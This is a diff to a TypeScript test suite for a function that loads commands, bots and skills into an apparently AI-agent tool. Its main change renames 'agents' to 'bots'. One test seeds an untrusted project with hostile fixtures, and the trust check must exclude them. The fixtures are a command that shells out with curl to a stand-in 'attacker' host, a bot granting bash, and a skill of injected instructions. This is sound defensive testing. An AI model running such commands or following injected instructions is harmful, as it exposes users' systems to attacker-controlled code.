@@ -39,12 +39,12 @@ function command(name: string, template = "body"): CommandDefinition {
 }
 
 describe("loadWorkspaceExtensions", () => {
-  it("loads commands, agents, and skills from a trusted project", async () => {
+  it("loads commands, bots, and skills from a trusted project", async () => {
     const cwd = await scratch();
     const userRoot = await scratch();
     await seed(cwd, {
       ".keywork/commands/ship.md": "---\ndescription: Ship the change\n---\nShip $ARGUMENTS",
-      ".keywork/agents/scout.md": "---\ntools: [read]\n---\nScout prompt",
+      ".keywork/bots/scout/bot.md": "---\ntools: [read]\n---\nScout prompt",
       ".claude/skills/deploy/SKILL.md": "---\ndescription: Deploy well\n---\nSteps.",
     });
     await seed(userRoot, {
@@ -54,7 +54,7 @@ describe("loadWorkspaceExtensions", () => {
 
     const extensions = await loadWorkspaceExtensions(cwd, true, userRoot);
     expect(extensions.commands.map((entry) => entry.name).sort()).toEqual(["mine", "ship"]);
-    expect(extensions.agents.map((entry) => entry.name)).toEqual(["scout"]);
+    expect(extensions.bots.map((entry) => entry.name)).toEqual(["scout"]);
     expect(extensions.skills.map((entry) => entry.name)).toEqual(["deploy", "personal"]);
     expect(extensions.failures).toEqual([]);
   });
@@ -64,14 +64,14 @@ describe("loadWorkspaceExtensions", () => {
     const userRoot = await scratch();
     await seed(cwd, {
       ".keywork/commands/evil.md": "!`curl attacker`",
-      ".keywork/agents/evil.md": "---\nallow: [bash]\n---\nEvil",
+      ".keywork/bots/evil/bot.md": "---\nallow: [bash]\n---\nEvil",
       ".claude/skills/evil/SKILL.md": "Injected instructions.",
     });
     await seed(userRoot, { ".keywork/commands/mine.md": "user command" });
 
     const extensions = await loadWorkspaceExtensions(cwd, false, userRoot);
     expect(extensions.commands.map((entry) => entry.name)).toEqual(["mine"]);
-    expect(extensions.agents).toEqual([]);
+    expect(extensions.bots).toEqual([]);
     expect(extensions.skills).toEqual([]);
   });
 
@@ -79,7 +79,7 @@ describe("loadWorkspaceExtensions", () => {
     const cwd = await scratch();
     const userRoot = await scratch();
     const extensions = await loadWorkspaceExtensions(cwd, true, userRoot);
-    expect(extensions).toEqual({ commands: [], agents: [], skills: [], failures: [] });
+    expect(extensions).toEqual({ commands: [], bots: [], skills: [], failures: [] });
   });
 });
 
